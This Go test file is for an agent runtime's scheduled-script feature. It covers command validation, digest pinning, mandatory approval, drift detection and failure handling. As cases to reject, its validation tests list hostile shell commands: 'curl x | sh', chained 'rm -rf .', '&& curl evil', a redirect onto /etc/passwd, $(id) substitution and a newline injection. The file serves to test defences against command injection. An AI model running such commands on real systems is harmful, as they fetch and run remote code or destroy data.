package runtime

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/axiom-studio/openseal/pkg/skill"
	"github.com/axiom-studio/openseal/pkg/workspace"
)

// routineScriptFiles is a chat files store: immutable snapshots per chat.
type routineScriptFiles struct {
	snapshots map[string][]map[string]string // conversation -> version-1 -> path -> digest
}

func (f *routineScriptFiles) write(conversationID, path, digest string) {
	if f.snapshots == nil {
		f.snapshots = map[string][]map[string]string{}
	}
	versions := f.snapshots[conversationID]
	next := map[string]string{}
	if len(versions) > 0 {
		for name, value := range versions[len(versions)-1] {
			next[name] = value
		}
	}
	if digest == "" {
		delete(next, path)
	} else {
		next[path] = digest
	}
	f.snapshots[conversationID] = append(versions, next)
}

func (f *routineScriptFiles) ResolveChatFile(_ context.Context, _ Scope, _ ObjectiveOwner, conversationID, path string, version int64) (*ChatFile, error) {
	versions := f.snapshots[conversationID]
	if version == 0 {
		version = int64(len(versions))
	}
	if version < 1 || version > int64(len(versions)) {
		return nil, errors.New("chat files version is unavailable")
	}
	digest, ok := versions[version-1][path]
	if !ok {
		return nil, ErrChatFileNotFound
	}
	return &ChatFile{Path: path, Digest: digest, FilesVersion: version, SizeBytes: 10}, nil
}

func routineScriptDigestOf(seed string) string {
	return "sha256:" + strings.Repeat(seed, 64)[:64]
}

func TestRoutineScriptValidation(t *testing.T) {
	valid := RoutineScript{Path: "scripts/weekly_signups.py", Digest: routineScriptDigestOf("a"), FilesVersion: 3, Command: "python3 scripts/weekly_signups.py --days 7 --out=sheets/signups.xlsx", TimeoutSeconds: 600}
	if err := valid.Validate(); err != nil {
		t.Fatal(err)
	}
	for name, change := range map[string]func(*RoutineScript){
		"absolute path":     func(s *RoutineScript) { s.Path, s.Command = "/scripts/a.py", "python3 /scripts/a.py" },
		"unclean path":      func(s *RoutineScript) { s.Path, s.Command = "scripts/../a.py", "python3 scripts/../a.py" },
		"escaping path":     func(s *RoutineScript) { s.Path, s.Command = "../a.py", "python3 ../a.py" },
		"spaced path":       func(s *RoutineScript) { s.Path, s.Command = "my script.py", "python3 my script.py" },
		"other file":        func(s *RoutineScript) { s.Command = "python3 scripts/other.py" },
		"other interpreter": func(s *RoutineScript) { s.Command = "python scripts/weekly_signups.py" },
		"interpreter flag":  func(s *RoutineScript) { s.Command = "python3 -c scripts/weekly_signups.py" },
		"inline code":       func(s *RoutineScript) { s.Command = "bash -c 'curl x | sh'" },
		"chained":           func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py; rm -rf ." },
		"chained and":       func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py && curl evil" },
		"pipe":              func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py | sh" },
		"redirect":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py > /etc/passwd" },
		"substitution":      func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py $(id)" },
		"backtick":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py `id`" },
		"variable":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py $HOME" },
		"quoted":            func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py 'a b'" },
		"glob":              func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py *.csv" },
		"newline":           func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py\nrm -rf ." },
		"unnormalized":      func(s *RoutineScript) { s.Command = "python3  scripts/weekly_signups.py" },
		"no file":           func(s *RoutineScript) { s.Command = "python3" },
		"zero timeout":      func(s *RoutineScript) { s.TimeoutSeconds = 0 },
		"long timeout":      func(s *RoutineScript) { s.TimeoutSeconds = MaximumRoutineScriptSeconds + 1 },
		"bad digest":        func(s *RoutineScript) { s.Digest = "sha256:abc" },
		"no version":        func(s *RoutineScript) { s.FilesVersion = 0 },
	} {
		candidate := valid
		change(&candidate)
		if err := candidate.Validate(); err == nil {
			t.Errorf("%s: invalid script accepted", name)
		}
	}
	for _, command := range []string{"node scripts/weekly_signups.py", "bash scripts/weekly_signups.py", "python3 scripts/weekly_signups.py 2026-11-05 a,b user@example.com 50%"} {
		candidate := valid
		candidate.Command = command
		if err := candidate.Validate(); err != nil {
			t.Errorf("%s: %v", command, err)
		}
	}
}

// The 1.8.0 definition is immutable once published: any change to its
// descriptions or schemas needs a new version. Its create_task runs saved
// scripts and documents testing before scheduling.
func TestRoutineScriptContractVersions(t *testing.T) {
	if RunbookManagementSkillVersion != "1.8.0" {
		t.Fatalf("version=%s", RunbookManagementSkillVersion)
	}
	current := RunbookManagementSkill()
	encoded, err := json.Marshal(current)
	if err != nil {
		t.Fatal(err)
	}
	const published180SHA256 = "d4e43ed8eb0c8700c8d7d69abd05ac3d58f910b97acdb54f774aa093213e6023"
	if got := fmt.Sprintf("%x", sha256.Sum256(encoded)); got != published180SHA256 {
		t.Fatalf("published 1.8.0 definition changed: got %s", got)
	}
	create := current.Actions[RunbookActionCreateTask]
	if _, ok := create.InputSchema["properties"].(map[string]interface{})["script"]; !ok || !strings.Contains(create.Description, "test it in this chat's sandbox with run_command") {
		t.Fatalf("create_task contract=%s", create.Description)
	}
	if setScript, ok := current.Actions[RunbookActionSetScript]; !ok || !setScript.AlwaysReview() {
		t.Fatal("set_script must always be reviewed")
	}
	if !strings.Contains(workspace.ChatSandboxDescription, "a routine can run that exact script") {
		t.Fatal("run_command does not mention scheduling a tested script")
	}
	if err := skill.NewCatalog().Register(t.Context(), current); err != nil {
		t.Fatal(err)
	}
}

// Creating and re-pinning a script routine both always ask, in every mode.
func TestRoutineScriptChangesAlwaysNeedApproval(t *testing.T) {
	definition := RunbookManagementSkill()
	for _, action := range []string{RunbookActionCreateTask, RunbookActionSetScript} {
		decision, err := NewDefaultActionPolicy().EvaluateAction(t.Context(), ActionPolicyInput{
			Run:   &AgentRun{ID: "run", Scope: Scope{Kind: "tenant", ID: "one"}},
			Bound: &skill.BoundAction{Definition: definition, Binding: &skill.Binding{ID: "routines"}, Action: definition.Actions[action]}, ApprovalMode: ConversationApprovalSkip,
			RoutineGrant: &RoutineGrant{Action: RunbookManagementSkillID + "." + action, Label: "anything"},
		})
		if err != nil || decision.Disposition != ActionDispositionRequireApproval || decision.ApprovalTimeout == ApprovalTimeoutApprove {
			t.Fatalf("%s: %#v %v", action, decision, err)
		}
	}
}

type routineScriptHost struct {
	requests []HostedTurnRequest
	respond  func(HostedTurnRequest) (*HostedTurnResponse, error)
}

func (h *routineScriptHost) ExecuteHostedTurn(_ context.Context, request HostedTurnRequest) (*HostedTurnResponse, error) {
	h.requests = append(h.requests, request)
	return h.respond(request)
}

func routineScriptReply(request HostedTurnRequest, summary string) *HostedTurnResponse {
	return &HostedTurnResponse{APIVersion: HostedTurnAPIVersion, InvocationID: request.InvocationID, ModelProvider: "test", Model: "model",
		NextRunStatus: AgentRunStatusCompleted, OutputSummary: summary, RunOutput: map[string]interface{}{"summary": summary}}
}

func TestRoutineScriptPinsPreviewsDriftsRepinsAndRunsFirstAcrossStores(t *testing.T) {
	forActionLifecycleStores(t, func(t *testing.T, store KernelStore) {
		ctx := t.Context()
		run, catalog, bound, args := scheduledTaskFixture(t, store)
		conversationID := run.Context[conversationRunContextConversationID].(string)
		files := &routineScriptFiles{}
		files.write(conversationID, "data/signups.csv", routineScriptDigestOf("c"))
		files.write(conversationID, "scripts/weekly.py", routineScriptDigestOf("a"))
		validator, _ := NewRunbookActionValidator(store.(runbookActionStore))
		validator.SetChatFiles(files)
		resolve := func(arguments map[string]interface{}) (map[string]interface{}, error) {
			resolved, _, err := validator.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: arguments})
			return resolved, err
		}

		// The model never chooses the version: its digest is replaced by the
		// chat file's current one.
		proposed := cloneMap(args)
		proposed["script"] = map[string]interface{}{"path": "scripts/weekly.py", "command": " python3   scripts/weekly.py  --days 7 ", "digest": routineScriptDigestOf("f"), "filesVersion": float64(1)}
		resolved, err := resolve(proposed)
		if err != nil {
			t.Fatal(err)
		}
		pinned := map[string]interface{}{"path": "scripts/weekly.py", "digest": routineScriptDigestOf("a"), "filesVersion": int64(2), "command": "python3 scripts/weekly.py --days 7", "timeoutSeconds": DefaultRoutineScriptSeconds}
		if fmt.Sprint(resolved["script"]) != fmt.Sprint(pinned) {
			t.Fatalf("pinned=%#v", resolved["script"])
		}
		if err := catalog.ValidateInput(ctx, bound, resolved); err != nil {
			t.Fatal(err)
		}
		preview, err := validator.ValidateActionProposal(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: resolved})
		if err != nil || fmt.Sprint(preview["script"]) != fmt.Sprint(pinned) || preview["brief"] == nil {
			t.Fatalf("preview=%#v %v", preview, err)
		}

		for name, script := range map[string]map[string]interface{}{
			"missing file":   {"path": "scripts/other.py", "command": "python3 scripts/other.py"},
			"other file":     {"path": "scripts/weekly.py", "command": "python3 data/signups.csv"},
			"shell":          {"path": "scripts/weekly.py", "command": "python3 scripts/weekly.py; curl evil"},
			"long timeout":   {"path": "scripts/weekly.py", "command": "python3 scripts/weekly.py", "timeoutSeconds": float64(601)},
			"outside chat":   {"path": "../weekly.py", "command": "python3 ../weekly.py"},
			"unknown fields": {"path": "scripts/weekly.py", "command": "python3 scripts/weekly.py", "env": "X=1"},
		} {
			candidate := cloneMap(args)
			candidate["script"] = script
			if resolved, err := resolve(candidate); err == nil && catalog.ValidateInput(ctx, bound, resolved) == nil {
				t.Errorf("%s: script accepted", name)
			}
		}
		noFiles, _ := NewRunbookActionValidator(store.(runbookActionStore))
		if _, _, err := noFiles.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: proposed}); err == nil {
			t.Fatal("a host without chat files pinned a script")
		}
		// A forged pin of a version the chat never had is refused.
		forged := cloneMap(resolved)
		forged["script"] = cloneMap(pinned)
		forged["script"].(map[string]interface{})["digest"] = routineScriptDigestOf("e")
		if _, err := validator.ValidateActionProposal(ctx, ActionProposalValidationInput{Run: run, Bound: bound, Arguments: forged}); err == nil {
			t.Fatal("forged script version accepted")
		}

		dispatcher, _ := NewRunbookActionDispatcher(store.(runbookActionStore), nil)
		dispatcher.SetChatFiles(files)
		dispatch := func(b *skill.BoundAction, arguments map[string]interface{}, callID string) (map[string]interface{}, error) {
			return dispatcher.DispatchAction(ctx, ActionDispatchInput{Run: run, Bound: b, Call: &ActionCall{ID: callID, Scope: run.Scope, RunID: run.ID, DeploymentID: run.AssignedAgentID, IdempotencyKey: callID}, Arguments: arguments})
		}
		// The script changes after the proposal but before approval: the
		// routine still runs the version the brief showed.
		files.write(conversationID, "scripts/weekly.py", routineScriptDigestOf("b"))
		result, err := dispatch(bound, resolved, "create-script-routine")
		if err != nil {
			t.Fatal(err)
		}
		activation := result["activation"].(*RunbookActivation)
		stored, err := store.GetRunbookActivation(ctx, run.Scope, activation.ID)
		if err != nil || stored.Task == nil || stored.Task.Script == nil || fmt.Sprint(routineScriptMap(stored.Task.Script)) != fmt.Sprint(pinned) {
			t.Fatalf("stored=%#v %v", stored, err)
		}

		// Drift: the chat file now differs from the approved version.
		status, err := NewRunbookActivationService(store).RoutineScriptStatus(ctx, files, run.Scope, activation.ID)
		if err != nil || !status.Changed || status.CurrentDigest != routineScriptDigestOf("b") || status.CurrentFilesVersion != 3 || status.Pinned.Digest != routineScriptDigestOf("a") {
			t.Fatalf("status=%#v %v", status, err)
		}

		// The occurrence carries the version pinned when it started.
		due := stored.NextRunAt.Add(time.Second)
		scheduler := NewRunbookScheduler(store)
		scheduler.now = func() time.Time { return due }
		if r, err := scheduler.ReconcileScope(ctx, run.Scope, 20); err != nil || r.Scheduled != 1 {
			t.Fatalf("schedule=%#v,%v", r, err)
		}
		runs, err := store.ListAgentRuns(ctx, AgentRunFilter{Scope: run.Scope, ObjectiveID: stored.ObjectiveID, Limit: 10})
		if err != nil || len(runs) != 1 {
			t.Fatalf("runs=%#v %v", runs, err)
		}
		occurrence := runs[0]
		if script, ok, err := routineScriptFromRun(occurrence); err != nil || !ok || script.Digest != routineScriptDigestOf("a") || script.FilesVersion != 2 {
			t.Fatalf("occurrence script=%#v %v %v", script, ok, err)
		}

		// Re-pinning asks again with the brief, pinned by the kernel.
		if stored, err = store.GetRunbookActivation(ctx, run.Scope, activation.ID); err != nil {
			t.Fatal(err)
		}
		setScript := RunbookManagementSkill().Actions[RunbookActionSetScript]
		repinBound := &skill.BoundAction{Definition: bound.Definition, Binding: bound.Binding, Action: setScript}
		repin := map[string]interface{}{"activationId": activation.ID, "expectedRevision": float64(stored.Revision), "digest": routineScriptDigestOf("f")}
		repinResolved, _, err := validator.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: repinBound, Arguments: repin})
		if err != nil || repinResolved["digest"] != routineScriptDigestOf("b") || repinResolved["filesVersion"] != int64(3) {
			t.Fatalf("repin=%#v %v", repinResolved, err)
		}
		repinPreview, err := validator.ValidateActionProposal(ctx, ActionProposalValidationInput{Run: run, Bound: repinBound, Arguments: repinResolved})
		if err != nil || repinPreview["operation"] != RunbookActionSetScript || repinPreview["title"] != "Forecast update" ||
			repinPreview["script"].(map[string]interface{})["digest"] != routineScriptDigestOf("b") || repinPreview["previousScript"].(map[string]interface{})["digest"] != routineScriptDigestOf("a") ||
			repinPreview["script"].(map[string]interface{})["command"] != "python3 scripts/weekly.py --days 7" {
			t.Fatalf("repin preview=%#v %v", repinPreview, err)
		}
		stale := cloneMap(repinResolved)
		stale["expectedRevision"] = float64(stored.Revision + 5)
		if _, err := dispatch(repinBound, stale, "stale-repin"); !errors.Is(err, ErrRunbookActivationRevision) {
			t.Fatalf("stale repin=%v", err)
		}
		repinned, err := dispatch(repinBound, repinResolved, "repin")
		if err != nil {
			t.Fatal(err)
		}
		after := repinned["activation"].(*RunbookActivation)
		if after.Task.Script.Digest != routineScriptDigestOf("b") || after.Task.Script.FilesVersion != 3 || after.Revision != stored.Revision+1 || after.Task.Script.Command != stored.Task.Script.Command {
			t.Fatalf("repinned=%#v", after.Task.Script)
		}
		if replay, err := dispatch(repinBound, repinResolved, "repin"); err != nil || replay["replayed"] != true {
			t.Fatalf("replay=%#v %v", replay, err)
		}
		if status, err := NewRunbookActivationService(store).RoutineScriptStatus(ctx, files, run.Scope, activation.ID); err != nil || status.Changed {
			t.Fatalf("status after repin=%#v %v", status, err)
		}
		if _, _, err := validator.ResolveActionProposalArguments(ctx, ActionProposalValidationInput{Run: run, Bound: repinBound, Arguments: map[string]interface{}{"activationId": activation.ID, "expectedRevision": float64(after.Revision)}}); err == nil {
			t.Fatal("re-pinned the version it already runs")
		}
		files.write(conversationID, "scripts/weekly.py", "")
		if status, err := NewRunbookActivationService(store).RoutineScriptStatus(ctx, files, run.Scope, activation.ID); err != nil || !status.Changed || !status.Missing {
			t.Fatalf("status after delete=%#v %v", status, err)
		}

		// The occurrence's first Turn: the host runs the pinned script, then
		// the model reports once. Its Run context came back from the store.
		occurrence, err = store.GetAgentRun(ctx, run.Scope, occurrence.ID)
		if err != nil {
			t.Fatal(err)
		}
		host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
			result := HostedPinnedScriptResult{Digest: request.PinnedScript.Digest, ExitCode: 0, StdoutTail: "412 signups", ChangedFiles: []string{"images/signups.png"}, FilesVersion: 9}
			modelRequest, err := ApplyPinnedScriptResult(request, result)
			if err != nil {
				return nil, err
			}
			if modelRequest.ContinuationCheckpoint[RoutineScriptCheckpointKey] == nil || len(modelRequest.Actions) != len(request.Actions) {
				t.Fatalf("model request=%#v", modelRequest.ContinuationCheckpoint)
			}
			response := routineScriptReply(request, "412 people signed up last week; chart attached.")
			response.PinnedScriptResult = &result
			response.ContinuationCheckpoint = map[string]interface{}{RoutineScriptCheckpointKey: "forged"}
			return response, nil
		}}
		runner, err := NewHostedTurnRunner(host, HostedTurnRunnerConfig{AgentID: occurrence.AssignedAgentID, DefinitionID: "agent", DefinitionVersion: "1"})
		if err != nil {
			t.Fatal(err)
		}
		outcome, err := runner.RunTurn(ctx, TurnExecutionContext{Run: occurrence, Turn: &AgentTurn{ID: "first"}})
		if err != nil {
			t.Fatal(err)
		}
		first := host.requests[0]
		if first.PinnedScript == nil || first.PinnedScript.Digest != routineScriptDigestOf("a") || first.PinnedScript.FilesVersion != 2 ||
			first.PinnedScript.Command != "python3 scripts/weekly.py --days 7" || first.PinnedScript.TimeoutSeconds != DefaultRoutineScriptSeconds ||
			first.PinnedScript.ExecutionKey != "routine-script:"+occurrence.ID+":"+routineScriptDigestOf("a") {
			t.Fatalf("pinned script=%#v", first.PinnedScript)
		}
		for _, operation := range first.WorkspaceOperations {
			if !routineScriptReadOperations[operation.Name] {
				t.Fatalf("script routine turn offered %s", operation.Name)
			}
		}
		if len(first.WorkspaceOperations) == 0 || !hasInstruction(first.SystemInstructions, RoutineScriptInstruction) {
			t.Fatal("script routine turn lacks its read tools or instruction")
		}
		if input, _ := MarshalHostedTurnModelInput(first); strings.Contains(string(input), "executionKey") {
			t.Fatal("pinned script reached model input")
		}
		record, _ := outcome.ContinuationCheckpoint[RoutineScriptCheckpointKey].(map[string]interface{})
		if record == nil || record["failed"] != false || record["result"].(map[string]interface{})["stdoutTail"] != "412 signups" || requiresFinalFailureExplanation(outcome.ContinuationCheckpoint) {
			t.Fatalf("record=%#v", outcome.ContinuationCheckpoint)
		}
		// Later Turns never run the script again.
		later := cloneAgentRun(occurrence)
		later.Checkpoint = outcome.ContinuationCheckpoint
		host.respond = func(request HostedTurnRequest) (*HostedTurnResponse, error) {
			return routineScriptReply(request, "Done."), nil
		}
		if _, err := runner.RunTurn(ctx, TurnExecutionContext{Run: later, Turn: &AgentTurn{ID: "second"}}); err != nil {
			t.Fatal(err)
		}
		if second := host.requests[1]; second.PinnedScript != nil || !hasInstruction(second.SystemInstructions, RoutineScriptInstruction) {
			t.Fatalf("second turn=%#v", second.PinnedScript)
		}
	})
}

func hasInstruction(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func routineScriptRun() *AgentRun {
	return &AgentRun{ID: "occurrence", Scope: Scope{Kind: "tenant", ID: "one"}, AssignedAgentID: "agent", Context: map[string]interface{}{
		conversationRunContextConversationID: "chat",
		RoutineScriptContextKey: map[string]interface{}{"path": "scripts/weekly.py", "digest": routineScriptDigestOf("a"), "filesVersion": float64(2),
			"command": "python3 scripts/weekly.py", "timeoutSeconds": float64(120)},
	}}
}

// A failed script fails the Run with one explanation: no actions, no
// Workspace tools, no rerun.
func TestRoutineScriptFailureIsExplainedNotRetried(t *testing.T) {
	failed := HostedPinnedScriptResult{Digest: routineScriptDigestOf("a"), ExitCode: 1, StderrTail: "Traceback (most recent call last):\nKeyError: 'signup_date'"}
	host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
		modelRequest, err := ApplyPinnedScriptResult(request, failed)
		if err != nil {
			return nil, err
		}
		if len(modelRequest.Actions) != 0 || len(modelRequest.WorkspaceOperations) != 0 || modelRequest.Workspace != nil ||
			!hasInstruction(modelRequest.SystemInstructions, RoutineScriptFailureInstruction) || !hasInstruction(modelRequest.SystemInstructions, FinalFailureExplanationSystemInstruction) {
			t.Fatalf("failure turn offers work: %#v", modelRequest)
		}
		response := routineScriptReply(request, "The signup script failed: the CSV no longer has a signup_date column.")
		response.PinnedScriptResult = &failed
		return response, nil
	}}
	runner, err := NewHostedTurnRunner(host, HostedTurnRunnerConfig{AgentID: "agent", DefinitionID: "agent", DefinitionVersion: "1"})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := runner.RunTurn(t.Context(), TurnExecutionContext{Run: routineScriptRun(), Turn: &AgentTurn{ID: "first"}})
	if err != nil {
		t.Fatal(err)
	}
	failure, _ := outcome.ContinuationCheckpoint[FinalFailureExplanationCheckpointKey].(map[string]interface{})
	message, _ := failure["message"].(string)
	if failure["kind"] != routineScriptFailureKind || !strings.Contains(message, "exited with status 1: python3 scripts/weekly.py") || !strings.Contains(message, "KeyError: 'signup_date'") {
		t.Fatalf("failure=%#v", failure)
	}
	if record := outcome.ContinuationCheckpoint[RoutineScriptCheckpointKey].(map[string]interface{}); record["failed"] != true {
		t.Fatalf("record=%#v", record)
	}

	// After a failure the model may not act, keep working or stay silent.
	for name, change := range map[string]func(*HostedTurnResponse){
		"action": func(r *HostedTurnResponse) {
			r.NextRunStatus = AgentRunStatusRunning
			r.ProposedAction = &TurnAction{Type: "action", Capability: "workspace.rerun", Summary: "Run it again"}
		},
		"continue": func(r *HostedTurnResponse) { r.NextRunStatus = AgentRunStatusRunning },
		"silent":   func(r *HostedTurnResponse) { r.OutputSummary, r.RunOutput = "", map[string]interface{}{} },
	} {
		host.respond = func(request HostedTurnRequest) (*HostedTurnResponse, error) {
			response := routineScriptReply(request, "Explained.")
			response.PinnedScriptResult = &failed
			change(response)
			return response, nil
		}
		if _, err := runner.RunTurn(t.Context(), TurnExecutionContext{Run: routineScriptRun(), Turn: &AgentTurn{ID: name}}); err == nil {
			t.Errorf("%s: failed script turn accepted", name)
		}
	}

	timedOut := HostedPinnedScriptResult{Digest: routineScriptDigestOf("a"), TimedOut: true, ExitCode: -1}
	if !timedOut.Failed() || !strings.Contains(timedOut.failureMessage(&HostedPinnedScript{Command: "python3 scripts/weekly.py", TimeoutSeconds: 120}), "timed out after 120 seconds") {
		t.Fatal("timeout is not a failure")
	}
	unavailable := HostedPinnedScriptResult{Error: "the approved version is not in this chat's files"}
	if err := unavailable.validate(&HostedPinnedScript{Digest: routineScriptDigestOf("a")}); err != nil || !unavailable.Failed() {
		t.Fatalf("host failure=%v", err)
	}
}

// The host runs the pinned script exactly when asked, at the pinned version.
func TestRoutineScriptHostContractIsEnforced(t *testing.T) {
	for name, respond := range map[string]func(HostedTurnRequest) *HostedTurnResponse{
		"skipped": func(request HostedTurnRequest) *HostedTurnResponse { return routineScriptReply(request, "Done.") },
		"other version": func(request HostedTurnRequest) *HostedTurnResponse {
			response := routineScriptReply(request, "Done.")
			response.PinnedScriptResult = &HostedPinnedScriptResult{Digest: routineScriptDigestOf("b")}
			return response
		},
		"changed file outside chat": func(request HostedTurnRequest) *HostedTurnResponse {
			response := routineScriptReply(request, "Done.")
			response.PinnedScriptResult = &HostedPinnedScriptResult{Digest: request.PinnedScript.Digest, ChangedFiles: []string{"../etc/passwd"}}
			return response
		},
		"huge output": func(request HostedTurnRequest) *HostedTurnResponse {
			response := routineScriptReply(request, "Done.")
			response.PinnedScriptResult = &HostedPinnedScriptResult{Digest: request.PinnedScript.Digest, StdoutTail: strings.Repeat("x", maximumRoutineScriptOutputTail+1)}
			return response
		},
	} {
		host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) { return respond(request), nil }}
		runner, _ := NewHostedTurnRunner(host, HostedTurnRunnerConfig{AgentID: "agent", DefinitionID: "agent", DefinitionVersion: "1"})
		if _, err := runner.RunTurn(t.Context(), TurnExecutionContext{Run: routineScriptRun(), Turn: &AgentTurn{ID: "first"}}); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// A Run that is not a script routine never reports a script result.
	host := &routineScriptHost{respond: func(request HostedTurnRequest) (*HostedTurnResponse, error) {
		response := routineScriptReply(request, "Done.")
		response.PinnedScriptResult = &HostedPinnedScriptResult{}
		return response, nil
	}}
	runner, _ := NewHostedTurnRunner(host, HostedTurnRunnerConfig{AgentID: "agent", DefinitionID: "agent", DefinitionVersion: "1"})
	plain := &AgentRun{ID: "plain", Scope: Scope{Kind: "tenant", ID: "one"}, Context: map[string]interface{}{conversationRunContextConversationID: "chat"}}
	if _, err := runner.RunTurn(t.Context(), TurnExecutionContext{Run: plain, Turn: &AgentTurn{ID: "first"}}); err == nil {
		t.Fatal("host invented a script result")
	}
	if host.requests[0].PinnedScript != nil {
		t.Fatal("plain Run asked for a script")
	}
}
